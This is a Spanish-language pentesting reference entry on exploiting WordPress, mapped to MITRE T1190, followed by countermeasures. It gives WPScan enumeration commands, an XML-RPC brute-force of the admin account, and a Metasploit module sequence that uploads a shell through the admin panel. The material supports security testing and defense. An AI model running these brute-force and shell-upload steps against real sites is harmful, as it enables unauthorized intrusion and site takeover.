# Explotación de CMS WordPress

## Descripción
La explotación de WordPress se centra en aprovechar vulnerabilidades en el núcleo (core), temas o complementos (plugins) de este gestor de contenidos. Dada su enorme cuota de mercado, es un objetivo frecuente para ataques automatizados. Los vectores más comunes incluyen la ejecución remota de código (RCE) a través de plugins vulnerables, la inyección SQL, y el abuso de funcionalidades legítimas como XML-RPC para ataques de fuerza bruta o escaneo de puertos internos.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1190 (Exploit Public-Facing Application)
- **Plataforma**: Web
- **Dificultad**: Intermedia

## Herramientas
- **WPScan** — escáner de seguridad especializado que identifica versiones, plugins vulnerables y realiza fuerza bruta.
- **Metasploit** (`exploit/unix/webapp/wp_admin_shell_upload`) — contiene numerosos módulos para explotar vulnerabilidades específicas de plugins.
- **Burp Suite** — para la manipulación manual de peticiones XML-RPC o peticiones autenticadas.

## Comandos / Ejemplos

### Escaneo exhaustivo con WPScan
```bash
# Enumerar plugins vulnerables, temas y usuarios
wpscan --url http://target-wp.com --enumerate vp,vt,u --api-token <TOKEN>
# El API token permite correlacionar hallazgos con la base de datos de vulnerabilidades de WPScan
```

### Fuerza Bruta vía XML-RPC
```bash
# El método 'system.multicall' permite probar cientos de credenciales en una sola petición HTTP
wpscan --url http://target-wp.com --password-attack xmlrpc -t 20 -U admin -P passwords.txt
```

### Explotación de Plugin Vulnerable (ej. RCE)
```bash
# Uso de un módulo de Metasploit para subir una shell a través del panel de administración
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.1.100
set USERNAME admin
set PASSWORD admin_pass
exploit
```

## Contramedidas
- Mantener WordPress, plugins y temas actualizados a la última versión.
- Deshabilitar XML-RPC si no es necesario o restringir el acceso al archivo `xmlrpc.php`.
- Implementar autenticación de dos factores (2FA) para el acceso al panel `/wp-admin`.
- Utilizar plugins de seguridad (como Wordfence o Sucuri) y firewalls de aplicaciones web (WAF).

## Referencias
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
